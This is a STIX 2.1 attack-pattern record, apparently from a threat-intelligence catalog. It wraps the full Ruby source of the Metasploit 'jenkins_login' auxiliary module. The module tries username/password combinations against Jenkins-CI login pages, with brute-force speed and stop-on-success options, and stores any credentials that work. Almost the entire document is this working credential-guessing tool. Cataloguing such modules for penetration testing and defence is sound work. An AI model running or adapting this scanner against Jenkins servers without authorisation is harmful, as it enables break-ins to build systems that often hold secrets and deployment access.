{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--95d12b08-8bd4-4e30-b72b-e2ab798d91e5",
    "created": "2024-08-14T16:28:33.990824Z",
    "modified": "2024-08-14T16:28:33.990828Z",
    "name": "Jenkins-CI Login Utility",
    "description": "This module attempts to login to a Jenkins-CI instance using a specific user/pass.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/jenkins_login.rb",
            "external_id": "jenkins_login.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'metasploit/framework/credential_collection'\nrequire 'metasploit/framework/login_scanner/jenkins'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Scanner\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Exploit::Remote::HTTP::Jenkins\n\n  def initialize\n    super(\n      'Name'           => 'Jenkins-CI Login Utility',\n      'Description'    => 'This module attempts to login to a Jenkins-CI instance using a specific user/pass.',\n      'Author'         => [ 'Nicholas Starke <starke.nicholas[at]gmail.com>' ],\n      'License'        => MSF_LICENSE\n    )\n\n    register_options(\n      [\n        OptEnum.new('HTTP_METHOD', [true, 'The HTTP method to use for the login', 'POST', ['GET', 'POST']]),\n        Opt::RPORT(8080),\n        OptString.new('TARGETURI', [ false, 'The path to the Jenkins-CI application'])\n      ])\n\n    deregister_options('PASSWORD_SPRAY')\n\n    register_autofilter_ports([ 80, 443, 8080, 8081, 8000 ])\n  end\n\n  def run_host(ip)\n    print_warning(\"#{self.fullname} is still calling the deprecated LOGIN_URL option! This is no longer supported.\") unless datastore['LOGIN_URL'].nil?\n    cred_collection = build_credential_collection(\n      username: datastore['USERNAME'],\n      password: datastore['PASSWORD']\n    )\n\n    login_uri = jenkins_uri_check(target_uri)\n    scanner = Metasploit::Framework::LoginScanner::Jenkins.new(\n      configure_http_login_scanner(\n        uri: normalize_uri(login_uri),\n        method: datastore['HTTP_METHOD'],\n        cred_details: cred_collection,\n        stop_on_success: datastore['STOP_ON_SUCCESS'],\n        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],\n        connection_timeout: 10,\n        http_username: datastore['HttpUsername'],\n        http_password: datastore['HttpPassword']\n      )\n    )\n\n    scanner.scan! do |result|\n      credential_data = result.to_h\n      credential_data.merge!(\n          module_fullname: fullname,\n          workspace_id: myworkspace_id\n      )\n      if result.success?\n        credential_core = create_credential(credential_data)\n        credential_data[:core] = credential_core\n        create_credential_login(credential_data)\n\n        print_good \"#{ip}:#{rport} - Login Successful: #{result.credential}\"\n      else\n        invalidate_login(credential_data)\n        vprint_error \"#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status})\"\n      end\n    end\n  end\nend\n"
}